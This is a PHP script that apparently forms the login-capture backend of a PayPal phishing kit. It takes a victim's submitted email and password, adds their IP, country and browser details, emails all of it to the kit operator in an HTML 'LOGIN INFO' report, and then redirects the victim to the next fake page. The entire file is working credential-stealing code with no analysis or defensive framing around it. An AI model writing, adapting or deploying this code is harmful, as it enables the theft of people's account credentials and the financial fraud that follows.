<?
session_start();
date_default_timezone_set('GMT');
$time = date('d/m/Y G:i:s');
include('../hyun.php');
include('../antibots.php');
include('../email.php');
$_SESSION['login'] = 'success';
/////////////////////////////////////////////////////////////////////////////////////
//                                                                                 //
//                                      LOGIN                                      //
//                                                                                 //
/////////////////////////////////////////////////////////////////////////////////////
$_SESSION['email'] = $_POST['email'];
$_SESSION['pass'] = $_POST ['pass'];
$msg = " 
<html>
<head><meta charset=\"UTF-8\">
</head>
<div style='font-size: 13px;font-family:arial;border-left:1px solid #C2C2C2;border-right:1px solid #C2C2C2'><hr style=\"border-top:1px solid #C2C2C2\">
<center><img width=\"50px\" src=\"http://i.imgur.com/konA54E.png\"><br>
<hr style=\"border-top:1px solid #C2C2C2\">
<b>LOGIN INFO</b></center>
<hr style=\"border-top:1px solid #C2C2C2\">
<div style=\"padding-left:6px\">
 Email       = <font style='color:#08559C;'>".$_SESSION['email']."</font><br>
 Password    = <font style='color:#08559C;'>".$_SESSION['pass']."</font><br>
 Country     = <font style='color:#08559C;'>".$_SESSION['cn']."</font><br>
</div>
<hr style=\"border-top:1px solid #C2C2C2\">
<div style=\"padding-left:6px\">
 Browser  = <font style='color:#08559C;'>".$_SESSION['bro']." On ".$_SESSION['os']."</font><br>
</div>
 <hr style=\"border-top:1px solid #C2C2C2\">
<div style=\"padding-left:6px\">
 IP       = <a style=\";color:#08559C\" href=\"http://www.ip-tracker.org/locator/ip-lookup.php?ip=".$_SESSION['ip']."\" >".$_SESSION['ip']."</a><br>
<span style=\"float:right\"> ".$time."</span></div>
<hr style=\"border-top:1px solid #C2C2C2\">
</html></div><br>\n";
$subject = "Log PPL Fresh Mon Pôte ✌ 💖 ♛  [".$_SESSION['code_cn']."] [".$_SESSION['ip']."]";
$headers = "From: PaPa Na InformatiQ <rez@nguessan.ci>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=UTF-8\n";
	@mail($to,$subject,$msg,$headers);
		header("Location: ./home?websc=_session=".$_SESSION['code_cn']."&".$_SESSION['SESSION']."");

?>